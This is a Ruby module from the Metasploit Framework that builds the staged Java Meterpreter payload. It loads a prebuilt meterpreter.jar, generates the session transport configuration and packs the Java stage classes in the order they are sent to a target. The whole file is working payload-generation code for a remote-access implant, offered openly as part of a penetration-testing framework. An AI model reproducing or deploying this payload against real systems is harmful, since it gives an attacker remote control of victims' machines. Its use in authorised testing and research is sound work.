# -*- coding: binary -*-

require 'msf/core'
require 'msf/base/sessions/meterpreter_options'
require 'msf/core/payload/uuid/options'

module Msf

###
#
# Common module stub for Java payloads that make use of Meterpreter.
#
###

module Payload::Java::MeterpreterLoader

  include Msf::Payload::Java
  include Msf::Payload::UUID::Options
  include Msf::Sessions::MeterpreterOptions

  def initialize(info = {})
    super(update_info(info,
      'Name'          => 'Java Meterpreter & Configuration',
      'Description'   => 'Java-specific meterpreter generation',
      'Author'        => ['OJ Reeves'],
      'Platform'      => 'java',
      'Arch'          => ARCH_JAVA,
      'PayloadCompat' => {'Convention' => 'http https'},
      'Stage'         => {'Payload' => ''}
      ))
  end

  def stage_payload(opts={})
    stage_meterpreter(opts)
  end

  #
  # Override the Payload::Java version so we can load a prebuilt jar to be
  # used as the final stage; calls super to get the intermediate stager.
  #
  def stage_meterpreter(opts={})
    met = MetasploitPayloads.read('meterpreter', 'meterpreter.jar')
    config = generate_config(opts)

    # All of the dependencies to create a jar loader, followed by the length
    # of the jar and the jar itself, then the config
    blocks = [
      generate_default_stage(opts),
      [met.length, met].pack('NA*'),
      [config.length, config].pack('NA*')
    ]

    # Deliberate off by 1 here. The call to super adds a null terminator
    # so we would add 1 for the null terminate and remove one for the call
    # to super.
    block_count = blocks.length + stage_class_files.length

    # Pack all the magic together
    (blocks + [block_count]).pack('A*' * blocks.length + 'N')
  end

  def generate_config(opts={})
    opts[:uuid] ||= generate_payload_uuid
    ds = opts[:datastore] || datastore

    # create the configuration block, which for staged connections is really simple.
    config_opts = {
      ascii_str:  true,
      arch:       opts[:uuid].arch,
      expiration: ds['SessionExpirationTimeout'].to_i,
      uuid:       opts[:uuid],
      transports: opts[:transport_config] || [transport_config(opts)],
      stageless:  opts[:stageless] == true
    }

    # create the configuration instance based off the parameters
    config = Rex::Payloads::Meterpreter::Config.new(config_opts)

    # return the binary version of it
    config.to_b
  end

  def stage_class_files
    # Order matters.  Classes can only reference classes that have already
    # been sent.  The last .class must implement Stage, i.e. have a start()
    # method.
    #
    # The Meterpreter.class stage is just a jar loader, not really anything
    # to do with meterpreter specifically.  This payload should eventually
    # be replaced with an actual meterpreter stage so we don't have to send
    # a second jar.
    [
      [ "javapayload", "stage", "Stage.class" ],
      [ "com", "metasploit", "meterpreter", "MemoryBufferURLConnection.class" ],
      [ "com", "metasploit", "meterpreter", "MemoryBufferURLStreamHandler.class" ],
      # Must be last!
      [ "javapayload", "stage", "Meterpreter.class" ],
    ]
  end

end
end

